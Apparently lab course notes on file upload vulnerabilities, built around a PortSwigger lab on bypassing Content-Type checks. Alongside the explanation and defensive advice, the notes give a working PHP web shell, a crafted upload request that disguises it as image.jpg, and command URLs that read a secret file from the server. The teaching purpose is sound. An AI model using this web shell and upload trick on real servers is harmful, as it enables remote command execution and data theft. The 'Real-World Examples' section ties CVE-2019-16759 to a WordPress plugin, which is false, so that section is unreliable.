---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Introduction to File Upload Vulnerabilities

File upload vulnerabilities occur when a web application allows users to upload files to the server without properly validating the file type, size, or content. These vulnerabilities can lead to various security issues, such as remote code execution, data leakage, and defacement attacks. In this chapter, we will delve into the specifics of file upload vulnerabilities, focusing on a scenario where an attacker bypasses content-type restrictions to upload a malicious web shell.

### Background Theory

Web applications often allow users to upload files for various purposes, such as profile pictures, documents, or media files. However, if the application does not enforce strict validation rules, attackers can exploit these features to upload malicious files. One common method is to bypass content-type restrictions, which are typically enforced by checking the `Content-Type` header in the HTTP request.

#### How Content-Type Restrictions Work

When a user uploads a file, the browser sends an HTTP POST request with the file data. The `Content-Type` header specifies the MIME type of the uploaded file. For example:

```http
POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

<file data>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

The server then checks the `Content-Type` header to ensure that the file is of an allowed type. However, this check can be bypassed by manipulating the `Content-Type` header or the file metadata.

### Real-World Examples

#### Recent CVEs and Breaches

One notable example of a file upload vulnerability is CVE-2019-16759, which affected the WordPress plugin WP File Download. The plugin allowed authenticated users to upload files without proper validation, leading to arbitrary file upload and potential remote code execution.

Another example is the breach at Capital One in 2019, where an attacker exploited a misconfigured server to gain unauthorized access to sensitive customer data. Although not directly related to file upload vulnerabilities, this incident highlights the importance of proper validation and access control mechanisms.

### Lab Setup

In this lab, we will simulate a scenario where an attacker bypasses content-type restrictions to upload a PHP web shell. The goal is to exfiltrate the contents of a specific file located at `/home/Carlos/secret`.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the Web Security Academy website at [portswigger.net/web-security](https://portswigger.net/web-security).
2. Click on the "Sign up" button to create an account.
3. Once logged in, navigate to the "Academy" section.
4. Search for "file upload vulnerabilities" and select the lab titled "WebShell Upload via content-type restriction bypass."

### Understanding the Vulnerability

The lab contains a vulnerable image upload function. The application attempts to prevent users from uploading unexpected file types by checking the `Content-Type` header. However, this check is based on user-controllable input, making it susceptible to manipulation.

#### Vulnerable Code Example

Here is a simplified version of the vulnerable code:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $file = $_FILES['file'];
    $allowedTypes = ['image/jpeg', 'image/png'];

    if (in_array($file['type'], $allowedTypes)) {
        move_uploaded_file($file['tmp_name'], '/uploads/' . $file['name']);
        echo "File uploaded successfully.";
    } else {
        echo "Invalid file type.";
    }
}
?>
```

This code checks the `Content-Type` header (`$file['type']`) against a list of allowed types. However, an attacker can manipulate this header to bypass the restriction.

### Exploiting the Vulnerability

To exploit this vulnerability, we need to upload a PHP web shell. A simple PHP web shell might look like this:

```php
<?php
echo "Web shell active!";
system($_GET['cmd']);
?>
```

#### Crafting the Attack

We will use a tool like Burp Suite to craft the attack. Here is the process:

1. **Capture the Request**: Use Burp Suite to capture the initial file upload request.
2. **Modify the Request**: Change the `Content-Type` header to a permitted type and attach the PHP web shell as the file data.

Here is an example of the modified HTTP request:

```http
POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

<?php
echo "Web shell active!";
system($_GET['cmd']);
?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### Executing the Attack

Once the web shell is uploaded, we can interact with it by accessing the uploaded file URL and passing commands through the `cmd` parameter. For example:

```
http://example.com/uploads/image.jpg?cmd=id
```

This would execute the `id` command on the server and return the output.

### Exfiltrating the Secret

The final step is to exfiltrate the contents of the file `/home/Carlos/secret`. We can achieve this by using the web shell to read the file and send the contents back to us.

#### Reading the File

Using the web shell, we can execute a command to read the file:

```
http://example.com/uploads/image.jpg?cmd=cat%20/home/Carlos/secret
```

This command reads the contents of the file and returns them in the HTTP response.

### How to Prevent / Defend

#### Detection

To detect file upload vulnerabilities, organizations should implement monitoring and logging mechanisms. Tools like intrusion detection systems (IDS) and security information and event management (SIEM) systems can help identify suspicious activities related to file uploads.

#### Prevention

1. **Strict Validation**: Ensure that file uploads are strictly validated. Check both the `Content-Type` header and the file extension.
2. **Content Scanning**: Use content scanning tools to detect malicious files before they are stored on the server.
3. **Secure Storage**: Store uploaded files outside the web root directory to prevent direct access.
4. **Access Control**: Implement proper access control mechanisms to restrict access to uploaded files.

#### Secure Coding Fixes

Here is an example of a secure coding approach:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $file = $_FILES['file'];
    $allowedTypes = ['image/jpeg', 'image/png'];
    $allowedExtensions = ['jpg', 'png'];

    $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
    if (in_array($file['type'], $allowedTypes) && in_array(strtolower($ext), $allowedExtensions)) {
        $newFileName = uniqid() . '.' . $ext;
        move_uploaded_file($file['tmp_name'], '/secure_uploads/' . $newFileName);
        echo "File uploaded successfully.";
    } else {
        echo "Invalid file type or extension.";
    }
}
?>
```

This code checks both the `Content-Type` header and the file extension, ensuring that only valid files are uploaded.

### Conclusion

File upload vulnerabilities are a significant security concern for web applications. By understanding the underlying mechanisms and implementing robust validation and access control measures, organizations can mitigate the risks associated with these vulnerabilities. Always stay vigilant and keep your systems updated to protect against emerging threats.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs focused on file upload vulnerabilities.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing different types of attacks, including file upload vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for testing and learning about web vulnerabilities.

These labs provide a controlled environment to practice and understand the concepts discussed in this chapter.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/03-Lab 2 Web shell upload via Content Type restriction bypass/00-Overview|Overview]] | [[02-Disabling Requests Warnings and Setting Up Proxy Settings|Disabling Requests Warnings and Setting Up Proxy Settings]]
